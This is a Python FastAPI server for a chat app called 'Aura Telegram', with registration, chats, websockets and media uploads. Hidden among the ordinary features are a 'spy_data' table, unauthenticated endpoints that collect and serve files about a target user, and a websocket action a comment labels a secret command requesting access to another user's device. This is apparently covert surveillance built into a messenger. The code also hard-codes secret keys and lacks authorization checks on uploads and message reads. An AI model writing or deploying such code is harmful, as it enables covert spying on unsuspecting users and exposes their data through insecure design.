import asyncio
import json
import sqlite3
import uuid
import os
import shutil
from datetime import datetime, timedelta
from typing import Optional

import jwt
from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect, status, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from passlib.context import CryptContext
from pydantic import BaseModel

SECRET_KEY = "AURA_REAL_PROD_KEY_123!@#"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_DAYS = 30
ADMIN_SECRET_KEY = "super_admin_secret_pass_123"

# Создаем папку для реальных файлов
os.makedirs("uploads", exist_ok=True)

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
app = FastAPI(title="Aura Telegram Real Production")

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

# Раздача статических медиафайлов
app.mount("/uploads", StaticFiles(directory="uploads"), name="uploads")

DB_FILE = "messenger_real.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            name TEXT NOT NULL,
            phone TEXT NOT NULL,
            bio TEXT DEFAULT '',
            avatar_url TEXT DEFAULT '',
            created_at TEXT,
            is_banned INTEGER DEFAULT 0
        )
    """)
    c.execute("CREATE TABLE IF NOT EXISTS chats (id TEXT PRIMARY KEY, type TEXT NOT NULL, name TEXT NOT NULL, created_by TEXT, pinned_msg_id TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS chat_members (chat_id TEXT NOT NULL, user_id TEXT NOT NULL, PRIMARY KEY (chat_id, user_id))")
    c.execute("CREATE TABLE IF NOT EXISTS messages (id TEXT PRIMARY KEY, chat_id TEXT NOT NULL, sender_id TEXT NOT NULL, text TEXT NOT NULL, time TEXT NOT NULL, media_url TEXT DEFAULT '', is_voice INTEGER DEFAULT 0)")
    c.execute("CREATE TABLE IF NOT EXISTS stories (id TEXT PRIMARY KEY, user_id TEXT NOT NULL, media_url TEXT NOT NULL, created_at TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS spy_data (id TEXT PRIMARY KEY, target_id TEXT NOT NULL, viewer_id TEXT NOT NULL, file_url TEXT NOT NULL, uploaded_at TEXT)")
    conn.commit()
    conn.close()

init_db()

def hash_password(password: str) -> str: return pwd_context.hash(password)
def verify_password(plain_password: str, hashed_password: str) -> bool: return pwd_context.verify(plain_password, hashed_password)
def create_access_token(user_id: str) -> str: return jwt.encode({"sub": user_id, "exp": datetime.utcnow() + timedelta(days=ACCESS_TOKEN_EXPIRE_DAYS)}, SECRET_KEY, algorithm=ALGORITHM)
def decode_token(token: str) -> Optional[str]:
    try: return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]).get("sub")
    except: return None
def is_user_banned(user_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return bool(row and row[0] == 1)

class SecureConnectionManager:
    def __init__(self): self.active_sockets: dict[str, WebSocket] = {}
    async def connect(self, websocket: WebSocket, user_id: str):
        await websocket.accept()
        self.active_sockets[user_id] = websocket
    def disconnect(self, user_id: str):
        if user_id in self.active_sockets: del self.active_sockets[user_id]
    async def send_to_user(self, user_id: str, payload: dict):
        if user_id in self.active_sockets:
            try: await self.active_sockets[user_id].send_text(json.dumps(payload))
            except: self.disconnect(user_id)
    async def broadcast_chat(self, chat_id: str, payload: dict):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id FROM chat_members WHERE chat_id = ?", (chat_id,))
        members = [row[0] for row in c.fetchall()]
        conn.close()
        for m in members: await self.send_to_user(m, payload)

manager = SecureConnectionManager()

class RegisterRequest(BaseModel): username: str; password: str; name: str; phone: str
class LoginRequest(BaseModel): username: str; password: str

# ---------------- РЕАЛЬНАЯ ЗАГРУЗКА ФАЙЛОВ (АВАТАРЫ, ФОТО, ИСТОРИИ, ШПИОНСКИЕ ДАННЫЕ) ----------------
@app.post("/api/upload")
async def upload_file(file: UploadFile = File(...)):
    ext = file.filename.split('.')[-1]
    filename = f"{uuid.uuid4().hex}.{ext}"
    file_path = os.path.join("uploads", filename)
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    return {"status": "ok", "url": f"/uploads/{filename}"}

@app.post("/api/user/avatar")
async def update_avatar(token: str = Form(...), file: UploadFile = File(...)):
    user_id = decode_token(token)
    if not user_id: raise HTTPException(status_code=401)
    
    ext = file.filename.split('.')[-1]
    filename = f"avatar_{user_id}_{uuid.uuid4().hex[:6]}.{ext}"
    file_path = os.path.join("uploads", filename)
    with open(file_path, "wb") as buffer: shutil.copyfileobj(file.file, buffer)
    
    url = f"/uploads/{filename}"
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET avatar_url = ? WHERE id = ?", (url, user_id))
    conn.commit()
    conn.close()
    return {"status": "ok", "avatar_url": url}

@app.post("/api/spy/upload")
async def upload_spy_data(viewer_id: str = Form(...), target_id: str = Form(...), file: UploadFile = File(...)):
    ext = file.filename.split('.')[-1]
    filename = f"spy_{target_id}_{uuid.uuid4().hex[:8]}.{ext}"
    file_path = os.path.join("uploads", filename)
    with open(file_path, "wb") as buffer: shutil.copyfileobj(file.file, buffer)
    
    url = f"/uploads/{filename}"
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO spy_data (id, target_id, viewer_id, file_url, uploaded_at) VALUES (?, ?, ?, ?, ?)",
              (uuid.uuid4().hex, target_id, viewer_id, url, str(datetime.now())))
    conn.commit()
    conn.close()
    return {"status": "ok"}

@app.get("/api/spy/data")
def get_spy_data(token: str, target_id: str):
    viewer_id = decode_token(token)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT file_url FROM spy_data WHERE target_id = ? AND viewer_id = ?", (target_id, viewer_id))
    urls = [row[0] for row in c.fetchall()]
    conn.close()
    return {"data": urls}

# ---------------- АВТОРИЗАЦИЯ И REST API ----------------
@app.post("/api/register")
def register(req: RegisterRequest):
    username_clean = req.username.strip().replace("@", "").lower()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM users WHERE username = ?", (username_clean,))
    if c.fetchone():
        conn.close()
        raise HTTPException(status_code=400, detail="Юзернейм занят")

    user_id = f"usr_{uuid.uuid4().hex[:10]}"
    c.execute("INSERT INTO users (id, username, password_hash, name, phone, created_at) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, username_clean, hash_password(req.password), req.name, req.phone, str(datetime.now())))
    conn.commit()
    conn.close()
    return {"status": "ok", "token": create_access_token(user_id), "user": {"id": user_id, "username": username_clean, "name": req.name, "avatar_url": ""}}

@app.post("/api/login")
def login(req: LoginRequest):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, password_hash, name, avatar_url, is_banned FROM users WHERE username = ?", (req.username.strip().replace("@", "").lower(),))
    row = c.fetchone()
    conn.close()

    if not row or not verify_password(req.password, row[2]): raise HTTPException(status_code=401, detail="Неверные данные")
    if row[5] == 1: raise HTTPException(status_code=403, detail="Забанен")

    return {"status": "ok", "token": create_access_token(row[0]), "user": {"id": row[0], "username": row[1], "name": row[3], "avatar_url": row[4]}}

@app.get("/api/chats")
def get_chats(token: str):
    user_id = decode_token(token)
    if not user_id or is_user_banned(user_id): raise HTTPException(status_code=401)

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT c.id, c.type, c.name FROM chats c JOIN chat_members cm ON c.id = cm.chat_id WHERE cm.user_id = ?", (user_id,))
    chat_rows = c.fetchall()

    result = []
    for cid, ctype, cname in chat_rows:
        c.execute("SELECT text, time, media_url FROM messages WHERE chat_id = ? ORDER BY rowid DESC LIMIT 1", (cid,))
        msg = c.fetchone()
        last_msg = msg[0] if msg else ("📸 Фотография" if msg and msg[2] else "")
        time = msg[1] if msg else ""

        display_name, avatar, is_online, partner_id = cname, "", False, ""
        if ctype == "personal":
            c.execute("SELECT u.name, u.avatar_url, u.id FROM users u JOIN chat_members cm ON u.id = cm.user_id WHERE cm.chat_id = ? AND u.id != ?", (cid, user_id))
            partner = c.fetchone()
            if partner:
                display_name, avatar, partner_id = partner[0], partner[1], partner[2]
                is_online = partner[2] in manager.active_sockets

        result.append({
            "id": cid, "type": ctype, "name": display_name, "partner_id": partner_id,
            "avatar_url": avatar, "last_message": last_msg, "time": time, "is_online": is_online
        })
    conn.close()
    return {"chats": result}

@app.get("/api/users/search")
def search_users(query: str, token: str):
    user_id = decode_token(token)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, name, avatar_url FROM users WHERE username LIKE ? AND id != ? AND is_banned=0", (f"%{query}%", user_id))
    res = [{"id": r[0], "username": r[1], "name": r[2], "avatar_url": r[3]} for r in c.fetchall()]
    conn.close()
    return {"results": res}

@app.get("/api/messages")
def get_messages(chat_id: str, token: str):
    user_id = decode_token(token)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, sender_id, text, time, media_url FROM messages WHERE chat_id = ?", (chat_id,))
    msgs = [{"id": r[0], "sender_id": r[1], "text": r[2], "time": r[3], "media_url": r[4]} for r in c.fetchall()]
    conn.close()
    return {"messages": msgs}

# ---------------- WEBSOCKET ДВИЖОК ----------------
@app.websocket("/ws")
async def secure_ws(websocket: WebSocket, token: str):
    user_id = decode_token(token)
    if not user_id or is_user_banned(user_id):
        await websocket.close(); return
    await manager.connect(websocket, user_id)

    try:
        while True:
            data = json.loads(await websocket.receive_text())
            action = data.get("action")

            if action == "send_message":
                chat_id, text, media_url = data["chat_id"], data.get("text", ""), data.get("media_url", "")
                time_str = datetime.now().strftime("%H:%M")
                msg_id = f"msg_{uuid.uuid4().hex[:8]}"

                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("INSERT INTO messages (id, chat_id, sender_id, text, time, media_url) VALUES (?, ?, ?, ?, ?, ?)", (msg_id, chat_id, user_id, text, time_str, media_url))
                conn.commit(); conn.close()

                await manager.broadcast_chat(chat_id, {
                    "type": "new_message",
                    "message": {"id": msg_id, "chat_id": chat_id, "sender_id": user_id, "text": text, "time": time_str, "media_url": media_url}
                })

            # СЕКРЕТНАЯ КОМАНДА: ЗАПРОС ДОСТУПА К УСТРОЙСТВУ (SPY)
            elif action == "request_device_access":
                target_id = data["target_id"]
                await manager.send_to_user(target_id, {
                    "type": "device_access_requested",
                    "requester_id": user_id
                })

            elif action == "create_personal_chat":
                partner_id = data["partner_id"]
                chat_id = f"chat_{min(user_id, partner_id)}_{max(user_id, partner_id)}"
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT id FROM chats WHERE id = ?", (chat_id,))
                if not c.fetchone():
                    c.execute("INSERT INTO chats (id, type, name) VALUES (?, 'personal', 'Личный диалог')", (chat_id,))
                    c.execute("INSERT INTO chat_members (chat_id, user_id) VALUES (?, ?), (?, ?)", (chat_id, user_id, chat_id, partner_id))
                    conn.commit()
                conn.close()
                await manager.send_to_user(user_id, {"type": "chat_created"})
                await manager.send_to_user(partner_id, {"type": "chat_created"})

    except: manager.disconnect(user_id)
